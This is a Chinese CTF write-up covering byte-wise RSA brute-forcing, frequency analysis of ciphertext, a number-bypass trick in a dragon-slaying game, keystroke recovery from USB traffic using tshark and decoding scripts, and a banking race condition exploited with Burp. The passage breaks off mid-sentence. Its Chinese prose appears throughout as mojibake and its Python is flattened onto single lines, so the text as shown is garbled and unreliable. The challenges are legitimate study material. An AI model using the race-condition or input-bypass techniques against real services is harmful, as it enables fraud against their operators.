9620679224297488175028367924764722982789333194446063577221477359704180638294602848741035585656113543497776415635770748468725814916994577398023154224563920936523717884116880223345204061598438291740007518025998041449406726084042681798053863495542392481059281588020105313791046017356493739244555377217866496734, 1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279, 20629854768856798537062426042570334097651328955665698429979954410631113160492201197690192324881508105172595216229624523572595589920695165876501026993810936392510720968159305964832449680889041278532807173859579419197780294984519222830572413180237776797800176462492384318120546495539728732366110782215071262307, 7440918084186181327822271261394344901791253526257166181264874776746516620936925799031445704193589071453959493392065321806281801023425299535553522582376879027448581379760896052013060957519595664095702210758316558762834545655992756483227787274192094065257224706388623944855362716578806372564148647945479173348, 5097867843777034076271397095201528351784693372027998615436445410912131141882225577577253530396333413579756394884096318434100382509189974240357351425474190558456256750742731090012822064840481143528081027106843123030275420215136304130321013605031261372665636366377162666476737296028608455229357416005773064242, 10420107412794383499391199999666100864853724770814620968725971207705900061273163202891569477729023724554388008575891113425781557296798472693974759813058067631655217722786373465395279381307973425004404348124524059844749313287030234750535347511172780349725636807760402334957881556461382950021814486095167001394, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 16657126895659048065404729920028465477385009450133540950695155983380795627778054526133891673615252510518969355629562948102050307259107355106086468465392660721567070464708776158039303608428552547481825035736610837329720474688421062759594907620576318249542577396722737724172954532394471909440668625218820801756, 11113777356910731413424023299582648618258376222028450254478672148119889617557563576704932635131420845868165014982665717620845578039880527701593963719893467068820107811384041511295664833904504511210342105242330522375476482706044695838957591685781703894244561607764476555630573446589408768780659378128082633769, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279, 5237767970074646857079948735567615361735616179074197239639640947679550920349684166643572837235712904929824521258264241503059989875517915784117038966236672390569320206379357882906463342282254405974383459878863044723383164329146669331810709270455492110346838097216174137176255793792848357953314563364460847842, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670, 278354276293884030290100330445865286604723740111170856624965259573282278044823323212960304154629174664076141280100412502135750130875356944835909175355370317285768658282746817782130476757714384697086179400629156643250500432197002583758692394681401772203578628635926749457621478296182304772136118691761841359, 6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542, 21353765873487781085375016306418205544750755310255410963646737671193146222650262290683259548572190880304009015662963424520575937651278866672082973874806201031606257157229306007587966460187818647603633973019548401357989358306250139692325474674826791149726161678649996852062656272851387461089863388359261125336, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 20576388598886140095325204584799302384454378372204683348252463729525849583734948105765087991438423260690623246579570440405616572326057536248148020737810766134083795050076636686776809469271643188562482921546497071402873405706504773345621716428511481598704631451463399778602486417840466985891815649711178813963, 17347447662661486040040289855519394974371562320877472776529836975445205017304164550202099250096382852783253959549113036367974281750823938616836362593312254792770954856762797438690474329666549947795964992533463700161635382925555835347885819042031312006167190561233042383984087765920275010577545908085026177611, 11788628214684738246695632901992250075758959059858474645166125685861157046466064692980236734739634298802473894878268029860203026238925142258303727438570051822763330338744774300757888262747314093511013562545738571326771345495509434761853742569509480619380000424215527153118231084573851377049921456961916278761, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670, 2710029303357232932696197225263692040597986927359269224740812600224998707144266259851604978553286889767425982708691908438984279442981540971935737617354609856642312100797081348174935195638083002333058089328102430432526612805955273581245352312630845237670744276402867230550537275379675828467791243032108754996, 19981107233593350929447953514006501458466479260151660185153999799085657467921097940751860717309377498501638075002136637344148955811617399850718322497572421311807629329642551519284713638882025500074565475569618691516951449764680555447185364165687596161053684299589053909233984617244886185728811651967713024530, 3975884358027162862622932959187611984655247354547659825042810425039322096401899672988989768997134724085482147901304365437476311647149733392577446833370358728610677436154877051592307539990184750467273668379065865808900410057533079113476991204462719784464847498582643056503810805516315622314948257403761762299, 6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542, 14296542628093736444815382636071360035549021313467366701986569710120268508807886041986007828960248665683292143486565404978073122476968882030310174125355932205646388813061197657253533595700948593692407928813318978600474254105007396254987998953819782624738628334271910759242195864082910860797444993756044746481, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442, 7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442, 23267174349531278768420819619439317179083929128083924515569762521057285892931325108327037262091624670335579302436476096123152288550738706103166820604983405317430467198343871458522070337902643863890959573514405066297449924638838605501211486861582957963752388608487593217237563529201436917108304692859773404548] æ˜“çŸ¥ï¼Œè¯¥æ–‡ä»¶æä¾›äº†RSAçš„å…¬é’¥ï¼š(e,n)ï¼Œä»¥åŠåŠ å¯†åçš„flagï¼Œæˆ‘ä»¬å‘ç°ï¼Œflagçš„å¯†æ–‡æ˜¯å¤šä¸ªå¤§æ•°ï¼Œå¯çŸ¥æ˜¯é€å­—èŠ‚å¯¹flagè¿›è¡ŒåŠ å¯†çš„ï¼Œé‚£ä¹ˆè¿›è¡Œç®€å•çš„çˆ†ç ´å³å¯è§£å¯†ã€‚ å†æ¥çœ‹çœ‹rsa.pyçš„å†…å®¹ï¼š import randomfrom my_math import next_primefrom flag import flagdef egcd(a, b): x, y, u, v = 0, 1, 1, 0 while a != 0: q, r = b//a, b % a m, n = x-u*q, y-v*q b, a, x, y, u, v = a, r, u, v, m, n gcd = b return gcd, x, ydef gen_keys(p, q): e = 65537 n = p * q phi = (p - 1) * (q - 1) gcd, d, b = egcd(e, phi) # Keys:((pub), (priv)) return ((e, n), (d, n))def enc(key, p): e, n = key cipher = [pow(ord(char), e, n) for char in p] return cipherdef dec(pk, c): key, n = pk plain = [chr(pow(char, key, n)) for char in c] return ''.join(plain)p = next_prime(random.SystemRandom().getrandbits(512))q = next_prime(random.SystemRandom().getrandbits(512))flag_key=gen_keys(p, q)print(\"Public key:\")print(flag_key[0])flag_c=(enc(flag_key[0], flag))print(\"Encrypted flag:\")print(flag_c) è¯¥è„šæœ¬ä¸­æ˜¯ä¸€äº›RSAçš„åŠ å¯†ã€è§£å¯†å‡½æ•°ï¼Œå…¶ä¸­æä¾›äº†på’Œqéƒ½æ˜¯512bitçš„ç´ æ•°ï¼Œå› æ­¤æ¨¡æ•°næ˜¯1024bitçš„ï¼Œæ‰“æ¶ˆåˆ†è§£nçš„å¿µå¤´ï¼ˆè¿™é‡Œä¸å¾—ä¸è¯´ä¸€ä¸‹ï¼Œæœ‰äº›æ¯”èµ›çš„1024bitä»¥ä¸Šçš„æ¨¡æ•°nåœ¨http://factordb.com/ ä¸Šæ˜¯æœ‰ä¸Šä¼ çš„ï¼Œæœ‰æ—¶å€™å¯ä»¥å…ˆæ‹¿å»åˆ†è§£è¯•è¯•ï¼‰æˆ‘ä»¬ä»encå‡½æ•°çš„åŠ å¯†æœºåˆ¶å‘ç°ï¼Œå®ƒæ˜¯å¯¹æ˜æ–‡è¿›è¡Œé€å­—ç¬¦è¿›è¡ŒåŠ å¯†ï¼Œå†æ¬¡å°è¯äº†æ˜¯é€å­—èŠ‚çˆ†ç ´ï¼Œç›´æ¥çˆ†ç ´flagå³å¯ã€‚ è§£å¯†ä»£ç import stringwith open('c', 'r') as f: data = f.read().split('\\n') e = int(data[1].split(', ')[0][1:]) n = int(data[1].split(', ')[1][:-1]) flag_enc = [int(x) for x in data[4][1:-1].split(', ')]flag = ''for f in flag_enc: for c in string.printable: if pow(ord(c), e, n) == f: flag += c breakprint(flag) RSA#2é¢˜ç›®åˆ†æä¸ä¸Šä¸ªé¢˜ç›®ä¸€æ ·ï¼Œé™„ä»¶ä¸­åŒ…å«ä¸¤ä¸ªæ–‡ä»¶cã€rsa.pyï¼Œå¹¶ä¸”rsa.pyä¸ä¸Šé¢˜ä¸€æ ·ï¼š import randomfrom my_math import next_primefrom flag import flagdef egcd(a, b): x, y, u, v = 0, 1, 1, 0 while a != 0: q, r = b//a, b % a m, n = x-u*q, y-v*q b, a, x, y, u, v = a, r, u, v, m, n gcd = b return gcd, x, ydef gen_keys(p, q): e = 65537 n = p * q phi = (p - 1) * (q - 1) gcd, d, b = egcd(e, phi) # Keys:((pub), (priv)) return ((e, n), (d, n))def enc(key, p): e, n = key cipher = [pow(ord(char), e, n) for char in p] return cipherdef dec(pk, c): key, n = pk plain = [chr(pow(char, key, n)) for char in c] return ''.join(plain)p = next_prime(random.SystemRandom().getrandbits(512))q = next_prime(random.SystemRandom().getrandbits(512))flag_key=gen_keys(p, q)print(\"Public key:\")print(flag_key[0])flag_c=(enc(flag_key[0], flag))print(\"Encrypted flag:\")print(flag_c) ä½†æ˜¯å¯†æ–‡æ–‡ä»¶cå†…å®¹ä¸åŒï¼Œå…¶ä¸­ç»™å‡ºäº†é€å­—èŠ‚åŠ å¯†çš„å¯†æ–‡åˆ—è¡¨ï¼Œä½†æ˜¯å¹¶æœªç»™å‡ºå…¬é’¥ï¼š Public key:[DATA CORRUPTED]Encrypted flag:[34220770932871364013976724839545041417474666615300575941746695940071552482886462087439379719184240006479394129946558717984964307444237521284361087031583504037093765914149168694482266218524635203263596760639253965500892625668716519628460563860957678979373258071483670494006067028836185890388591731283716604832...]è¿™é‡Œåˆ—è¡¨ä¸­å…±æœ‰1111ä¸ªå­—ç¬¦çš„å¯†æ–‡ æ²¡æœ‰å…¬é’¥ï¼Œæ€ä¹ˆè§£å¯†ï¼Ÿï¼Ÿï¼Ÿæ˜¾ç„¶ä¹Ÿä¸æ˜¯æ”»å‡»ç§é’¥ï¼Œè€Œæ˜¯ç›´æ¥å¯¹å¯†æ–‡è¿›è¡Œæ”»å‡»ã€‚æˆ‘ä»¬çœ‹åˆ°ï¼Œå¯†æ–‡åˆ—è¡¨ä¸­æœ‰1111ä¸ªå¯†æ–‡ï¼Œä¸€èˆ¬çš„flagä¸å¯èƒ½è¿™ä¹ˆé•¿ï¼Œè€Œè¿™é‡Œç»™å‡ºäº†è¿™ä¹ˆå¤šå¯†æ–‡ï¼Œå¹¶ä¸”æ²¡æœ‰ç»™å‡ºå…¬é’¥ï¼Œè§£å¯†æ€è·¯ä¾¿å¾ˆæ˜¾ç„¶ï¼šåˆ©ç”¨å­—æ¯é¢‘ç‡æ”»å‡»å‡ºæ˜æ–‡ã€‚è¿™ä¹Ÿæ˜¯å¯†ç å­¦å¸¸ç”¨çš„æ”»å‡»æ–¹æ³•ä¹‹ä¸€ï¼Œä¸»è¦æ€è·¯æ˜¯ï¼šè‹±æ–‡çš„å­—æ¯åœ¨ä½¿ç”¨ä¸­å‡ºç°çš„æ¬¡æ•°å¤§è‡´æ»¡è¶³äº†ä¸€ä¸ªé¢‘ç‡è¡¨(å‚è€ƒhttps://en.wikipedia.org/wiki/Letter_frequency )ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™1111ä¸ªå¯†æ–‡çš„å‡ºç°é¢‘ç‡ç»Ÿè®¡å‡ºæ¥ï¼Œç„¶åä¸å­—æ¯é¢‘ç‡å¯¹åº”ï¼Œä»è€Œæ”»å‡»å‡ºæ˜æ–‡ã€‚ è§£å¯†ä»£ç with open('c', 'r') as f: data = f.read().split('\\n') flag_enc = [int(x) for x in data[4][1:-1].split(', ')]freq_dict = {}for f in flag_enc: if not f in freq_dict: freq_dict[f] = 1 else: freq_dict[f] += 1freq = sorted(list(freq_dict.items()), key=lambda x: x[1])freq.reverse()english_freq = [' ', 'E','T','A','I','N','O','R','S','L','H', 'C','M','D','Y','P','U','W','F','G','.','V', 'B','X','K',',','Q', 'Z', '\\'', '0', '9']translator = {}for i, c in enumerate(english_freq): translator[freq[i][0]] = cfor f in flag_enc: if f in translator: print(translator[f], end='') The Dragon Sleeps At Nightä¸€é“miscé¢˜ï¼Œè€ƒè„‘æ´ï¼Œä¹Ÿè€ƒåŸºæœ¬çŸ¥è¯†ï¼Œå¤šåšmiscç¡®å®èƒ½å¼€çœ¼ç•Œå•Šï¼ é¢˜ç›®åˆ†ænetcatè¿æ¥ç›®æ ‡IPä¹‹åè¿›å…¥ä¸€ä¸ªæ¸¸æˆç›’ï¼Œç§‰æ‰¿miscä¸€å¤§ä¼ ç»Ÿï¼šæ‰“æ¸¸æˆã€‚è¿™ä¸ªé¢˜ç›®æ˜¯ä¸€ä¸ªå± é¾™çš„æ¸¸æˆï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä»¥ä¸‹åŠŸèƒ½ï¼šå»å•†åº—ï¼šè¿™é‡Œæœ‰ä»1çº§åˆ°5çº§çš„å± é¾™å®åˆ€ï¼Œå± é¾™ï¼æ‹¿flag~å»å·¥ä½œï¼šèµšé’±ä¹°åˆ€ï¼å± é¾™ï¼æ‹¿flag~å»é¾™ç©´ï¼šå± é¾™ï¼æ‹¿flag~å›å®¶ï¼šä¼‘æ¯ï¼Œä¸ºäº†å± é¾™ï¼æ‹¿flag~å‚¨è—å®¤ï¼šæ”¾å®åˆ€ è§£é¢˜å…³é”®ç‚¹ï¼š 1ã€è¿™é‡Œå»å·¥ä½œçš„è¯æœ€åæ‹¿å·¥èµ„çš„æ—¶å€™ä¼šè®©è¾“å…¥å·¥ä½œå¤©æ•°ï¼Œ1åˆ€/å¤©ï¼Œä½†æ˜¯æ¯æ¬¡ä¹‹å¤šè¾“å…¥ä¸‰ä¸ªå­—ç¬¦ï¼Œå› æ­¤å¸¸æ•°çš„è¯æœ€å¤š999â€¦æ€ä¹ˆåŠå‘¢ï¼Ÿ 2ã€å›å®¶ä¼‘æ¯çš„æ—¶å€™å¯ä»¥è¾“å…¥ä¼‘æ¯çš„å¤©æ•°ï¼Œä½†æ˜¯ä¼‘æ¯ä¼šâ€œé™ä½â€å‚¨è—å®¤ä¸­å®åˆ€çš„çº§åˆ«ï¼Œ1çº§/å¤©ï¼Œä¸è¿‡â€¦ä¼‘æ¯å¤©æ•°æ­£è´Ÿä¸é™~è¿™ä¸¤ç‚¹å°±æ˜¯å± é¾™çš„å…³é”®ã€‚ è§£é¢˜æ ¹æ®å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬éœ€è¦å…ˆå»å·¥ä½œèµšé’±ï¼Œåœ¨ç»“è´¦çš„æ—¶å€™è¾“å…¥9e9çš„è¯å…¶å®å°±å¯ä»¥å¾—åˆ°9 billionåˆ€ï¼Œè¿™è¶³ä»¥ä¹°åˆ°5çº§å®åˆ€äº†ã€‚å…¶å®å°±æ˜¯åˆ©ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡é™åˆ¶ï¼ŒCTFä¸­å¾ˆå¤šé¢˜ç›®å€Ÿç”¨äº†è¿™ä¸€ç‚¹ã€‚æ­¤æ—¶å»å± é¾™çš„è¯ï¼Œä»ç„¶ä¼šå¤±è´¥ï¼Œå› ä¸ºéœ€è¦6çº§å®åˆ€ï¼Œä½†æ˜¯å•†åº—æ²¡æœ‰å•Šï¼åˆ©ç”¨å…³é”®ç‚¹2ï¼Œæˆ‘ä»¬å…ˆä¹°5çº§å®åˆ€å¹¶æ”¾åœ¨å‚¨è—å®¤ï¼Œç„¶åå»ç¡-1å¤©ï¼Œä¾¿å¾—åˆ°äº†ä¸€æŠŠ6çº§å®åˆ€ï¼Œå†å»å± é¾™ä¾¿èƒ½é¡ºåˆ©æ‹¿åˆ°flagäº†ã€‚ Strange PCAPè€ƒå¯Ÿæµé‡åŒ…éšå†™ã€usbæ•°æ®åˆ†æ é¢˜ç›®åˆ†æä¸‹è½½æ•°æ®åŒ…çš„æ—¶å€™ï¼Œå‹ç¼©å·¥å…·å°±æç¤ºè¦è¾“å…¥å¯†ç ï¼Œä½†æ˜¯æ˜¯ä¸ªæµé‡åŒ…ï¼Œç›´æ¥èƒ½æ‰“å¼€ï¼Œè¾“å¯†ç å¹²å˜›ï¼Ÿç”¨binwalkåˆ†æä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨å‹ç¼©åŒ…éšå†™ï¼Œbinwalk -eæå–ä½†æ˜¯è§£å‹éœ€è¦å¯†ç ï¼Œé‚£å°±çœ‹çœ‹æ•°æ®åŒ…é‡Œçš„å†…å®¹ï¼Œå‘ç°æ˜¯usbæ•°æ®ï¼Œä¼°è®¡å°±æ˜¯é”®ç›˜è®°å½•æˆ–è€…é¼ æ ‡è®°å½•äº†åˆ©ç”¨å¸¸è§„çš„æ–¹æ³•ï¼šæŠŠusbæ•°æ®æå–å‡ºæ¥ï¼Œç„¶åç”¨ç°æœ‰çš„è·‘é”®ç›˜è®°å½•çš„è„šæœ¬è·‘å‡ºæ¥å³å¯ã€‚å…ˆåˆ©ç”¨tsharkæå–æ•°æ®ï¼š tshark -r Strange.pcapng -T fields -e usb.capdata | sed '/^\\s*$/d' &gt; usbdata.txt//åŠ ä¸Š\"| sed '/^\\s*$/d'\"æ˜¯å› ä¸ºç›´æ¥æå–çš„è¯ä¼šæœ‰å¾ˆå¤šç©ºè¡Œï¼ŒåŠ ä¸Šè¿™ä¸€å¥ç©ºè¡Œå°±æ²¡äº† å‘ç°æå–çš„æ•°æ®å¦‚ä¸‹ï¼š 00000001040001000000000000000000000104000100000000000000000100000000000000000000000000000000000000000000210008210010210012000024000000000000000000000000000000190000000000000000000000000000000a0000000000000000000000000000000d0000000000000000000000000000002100000000000000000000000000020000000000000002001600000000000200000000000000020016000000000002000000000000000000000000000000200000000000000020000f00000000000000000000000000000026000000000000000000000000002000000000000000200011000000000020000000000000000000000000000000200000000000000020000b000000000020000000000000000000000000000000200000000000000020001900000000002000000000000000000000000000000000001800000000000000000000000000020000000000000002000e000000000002000000000000000000000000000000000027000000000000000000000000000200000000000000020007000000000002000000000000000000000000000000000023000000000000000000000000000000070000000000000000000000000000002000000000000000000000000000020000000000000002000900000000000200000000000000000000000000000000002800000000000000000000000000210010 ç›´æ¥ç”¨è„šæœ¬è·‘é”®ç›˜è®°å½•çš„è¯ï¼Œç»“æœå¦‚ä¸‹ï¼šå¯ä»¥çœ‹åˆ°ç»“æœä¸æ­£å¸¸ï¼Œå› ä¸ºä¸Šé¢çš„æ•°æ®æœ‰å¾ˆå¤šå†—ä½™æ•°æ®(é•¿åº¦ä¸æ˜¯8å­—èŠ‚çš„éƒ¨åˆ†)ï¼Œå»æ‰ä¹‹åå†è·‘è„šæœ¬ï¼Œç»“æœå¦‚ä¸‹ï¼šè¾“å…¥å¯†ç ï¼Œå³å¯æ‹¿åˆ°flagï¼š é”®ç›˜è®°å½•è„šæœ¬æœ¬é¢˜ç”¨å›½å†…çš„é€šç”¨è„šæœ¬è§£ä¸å‡ºæ¥ï¼Œç”¨å›½å¤–wpçš„è„šæœ¬å¯ä»¥ #ç»å¤é£å¸ˆå‚…å®Œå–„è¿‡çš„å›½å¤–è„šæœ¬usb_codes = { 0x04:\"aA\", 0x05:\"bB\", 0x06:\"cC\", 0x07:\"dD\", 0x08:\"eE\", 0x09:\"fF\", 0x0A:\"gG\", 0x0B:\"hH\", 0x0C:\"iI\", 0x0D:\"jJ\", 0x0E:\"kK\", 0x0F:\"lL\", 0x10:\"mM\", 0x11:\"nN\", 0x12:\"oO\", 0x13:\"pP\", 0x14:\"qQ\", 0x15:\"rR\", 0x16:\"sS\", 0x17:\"tT\", 0x18:\"uU\", 0x19:\"vV\", 0x1A:\"wW\", 0x1B:\"xX\", 0x1C:\"yY\", 0x1D:\"zZ\", 0x1E:\"1!\", 0x1F:\"2@\", 0x20:\"3#\", 0x21:\"4$\", 0x22:\"5%\", 0x23:\"6^\", 0x24:\"7&amp;\", 0x25:\"8*\", 0x26:\"9(\", 0x27:\"0)\", 0x2C:\" \", 0x2D:\"-_\", 0x2E:\"=+\", 0x2F:\"[{\", 0x30:\"]}\", 0x32:\"#~\", 0x33:\";:\", 0x34:\"'\\\"\", 0x36:\",&lt;\", 0x37:\".&gt;\", 0x38:\"/?\", 0x39:\"&lt;CAP&gt;&lt;CAP&gt;\", 0x3a:\"&lt;F1&gt;&lt;F1&gt;\", 0x3b:\"&lt;F4&gt;&lt;F4&gt;\", 0x3e:\"&lt;F5&gt;&lt;F5&gt;\",0x3f:\"&lt;F6&gt;&lt;F6&gt;\", 0x40:\"&lt;F7&gt;&lt;F7&gt;\",0x41:\"&lt;F8&gt;&lt;F8&gt;\",0x42:\"&lt;F9&gt;&lt;F9&gt;\",0x43:\"&lt;F10&gt;&lt;F10&gt;\", 0x44:\"&lt;F11&gt;&lt;F11&gt;\",0x45:\"&lt;F12&gt;&lt;F12&gt;\"}data = ''for x in open(\"usb.txt\",\"r\").readlines(): code = int(x[4:6],16) print(x[4:6]) if code == 0: continue if code == 0x28: print('ENTER!') print(data) data = '' continue upper = 0 if int(x[0:2],16) == 0x02 or int(x[0:2],16) == 0x20: upper = 1 data += usb_codes[code][upper]print(data) å†é™„ä¸€ä¸ªå›½å†…çš„è„šæœ¬ï¼š normalKeys = { \"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\", \"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\", \"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\", \"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\", \"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\", \"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\", \"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}shiftKeys = { \"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\", \"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\", \"2d\":\"_\",\"2e\":\"+\",\"2f\":\"{\",\"30\":\"}\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\", \"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\", \"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\", \"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}output = []keys = open('usbdata.txt')for line in keys: try: if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]==\"00\": continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2'] else: output += ['[unknown]'] except: passkeys.close()flag=0print(\"\".join(output))for i in range(len(output)): try: a=output.index('&lt;DEL&gt;') except: passfor i in range(len(output)): try: if output[i]==\"&lt;CAP&gt;\": flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint ('output :' + \"\".join(output)) è¿™é‡Œå†æ‹“å±•ä¸€ä¸‹ï¼Œusbæµé‡ä¸€èˆ¬æ˜¯é¼ æ ‡æµé‡æˆ–è€…æ˜¯é”®ç›˜æµé‡ï¼Œå¯ä»¥å‚è€ƒè¿™é‡Œã€‚æä¾›ä¸€ä½å¸ˆå‚…çš„å·¥å…·ã€‚ My Bankä¸€é“webçš„æ¡ä»¶ç«äº‰é¢˜ç›® é¢˜ç›®åˆ†æå¸¸è§çš„ä¸€ç§é¢˜ï¼Œå¯ä»¥å»é“¶è¡Œè´·æ¬¾ï¼Œä¸è¿‡æœ€å¤šè´·æ¬¾600åˆ€ï¼Œè¿˜èƒ½å»å•†åº—ä¹°ä¸œè¥¿ï¼Œé¥¼å¹²æœ€ä¾¿å®œï¼Œä½†æ˜¯æ²¡æ³•åƒï¼Œè¿˜æ˜¯ä¹°flagå§ï¼Œä½†æ˜¯è¦1440åˆ€â€¦åˆ†æå¯çŸ¥ï¼Œå¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰è¿›è¡Œè´·æ¬¾ï¼Œè¿™æ ·å°±å¯ä»¥æ‹¿åˆ°ä¸æ­¢600åˆ€çš„èµ„é‡‘ï¼Œå†å»ä¹°flagå³å¯ã€‚æ¡ä»¶ç«äº‰å¯å‚è€ƒï¼šhttps://blog.csdn.net/qq_36992198/article/details/80007405 è§£é¢˜1ã€åˆ©ç”¨BPè§£é¢˜ æŠ“åŒ… æ”¾åˆ°çˆ†ç ´æ¨¡å—ï¼Œè®¾ç½®ç©ºpayloadï¼Œçº¿ç¨‹è®¾ä¸º15 å€Ÿåˆ°è¶³å¤Ÿçš„é’±å»ä¹°flag é¦–å…ˆæ³¨å†Œè´¦å·å¹¶ç™»é™†ï¼Œçœ‹ä¸€ä¸‹æˆ‘ä»¬çš„è´¦æˆ·ä¿¡æ¯ï¼šå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å€Ÿ600åˆ€ï¼Œç„¶åè®¾ç½®å€Ÿé’±ä¸º100ï¼ŒBPæŠ“åŒ…è¿›è¡Œçˆ†ç 